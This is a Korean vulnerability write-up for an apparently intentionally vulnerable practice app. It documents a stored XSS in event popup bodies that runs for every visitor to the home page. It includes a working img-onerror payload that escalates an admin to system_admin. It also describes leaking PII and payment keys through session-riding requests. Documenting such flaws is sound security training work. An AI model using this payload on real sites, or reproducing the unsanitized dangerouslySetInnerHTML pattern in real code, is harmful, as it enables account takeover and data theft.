# VULN-023 이벤트 팝업 본문 저장형 XSS (메인 페이지 전역 렌더)

- 대상 스택: node-express, java-spring, client
- 심각도: High
- 분류: A05:2025 Injection (Stored XSS, CWE-79)

## 위치

- `apps/node-express/src/routes/events.js` `POST /api/events` / `PUT /api/events/:id` —
  `body` 필드를 정제·이스케이프 없이 `events.body` 에 저장.
- `apps/java-spring/.../controller/EventController.java` — 동일. `Event.body` 를 그대로 저장.
- `apps/client/src/components/EventPopups.jsx` — `GET /api/events` 로 받은 각 이벤트의
  `body` 를 `dangerouslySetInnerHTML={{ __html: event.body }}` 로 렌더. 이 팝업은
  **메인 페이지(`/`) 로딩 시 모든 방문자에게** 표시된다.

이벤트 작성은 `requireAdmin`(= `admin` 또는 `system_admin`) 으로 제한된다. 그러나 `admin`
등급은 상품/문의 관리를 위해 폭넓게 부여되는 역할이고, `system_admin` 으로의 권한 변경 권한은
없다(VULN-013 와 대비). 저장된 페이로드는 홈을 여는 **모든** 세션에서 실행되므로,
`admin` 계정 하나가 `system_admin` 을 포함한 임의 방문자의 세션을 탈취/조작할 수 있다.

## 트리거 방법

`admin` 세션으로:

**중요**: 팝업은 `EventPopups.jsx`가 `e.startsAt && e.endsAt`가 모두 있는 이벤트만 렌더한다 — 날짜 없는
이벤트는 `GET /api/events`엔 있어도 **팝업으로 안 뜨고 XSS도 실행되지 않는다.** 따라서 페이로드에
`startsAt`(과거)·`endsAt`(미래)를 반드시 넣는다.

```
POST /api/{node,java}/events   (admin 세션)
{"title":"깜짝 이벤트",
 "body":"<img src=x onerror=\"fetch('/api/node/admin/users/2/role',{method:'PUT',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({role:'system_admin'})})\">",
 "active":true,
 "startsAt":"2026-01-01T00:00:00Z","endsAt":"2027-01-01T00:00:00Z"}
```

이후 `system_admin`(`9u4a`) 이 홈(`/`) 을 열면 팝업 렌더 시 페이로드가 그의 세션으로
실행되어 `admin`(user id 2) 을 `system_admin` 으로 승격한다.

- 쿠키 탈취: `<script>...</script>`는 `dangerouslySetInnerHTML`(innerHTML)로 삽입 시 실행되지 않으므로
  `<img src=x onerror=...>` 형태를 쓴다. 세션 쿠키는 `HttpOnly`라 `document.cookie`엔 안 나오므로,
  세션을 탄 요청(`fetch('/api/*/profile')` 등)으로 PII·주문 `tossPaymentKey` 유출.

## 영향

- 인증된 `admin` → 홈 방문 전원 대상 세션 라이딩. `system_admin` 승격(권한 경계 돌파),
  타 사용자 PII/결제정보 유출, 피싱 콘텐츠 삽입.
- 팝업이 첫 화면에 뜨므로 사용자 상호작용 없이 실행.

## 증거 (재현 확인)

코드 확인(2026-09-01): 저장 경로는 `body` 무정제 저장, 렌더는 `EventPopups.jsx`의
`dangerouslySetInnerHTML`. 팝업 노출 조건은 `startsAt && endsAt` 존재 — 두 날짜를 채운 이벤트만
홈에서 팝업으로 떠 페이로드가 실행된다(날짜 없는 문서 예전 페이로드는 미발화였음, 위 트리거로 정정).

## 조치 상태: 미조치 (의도된 취약점)

정상 구현: 이벤트 본문을 신뢰할 수 없는 입력으로 취급 — 서버에서 HTML 새니타이즈
(허용 태그 화이트리스트) 하거나 클라이언트에서 `dangerouslySetInnerHTML` 대신 텍스트 렌더 +
제한된 마크다운. 관리 콘솔 입력이라도 저장형 XSS 경계는 유지해야 한다.
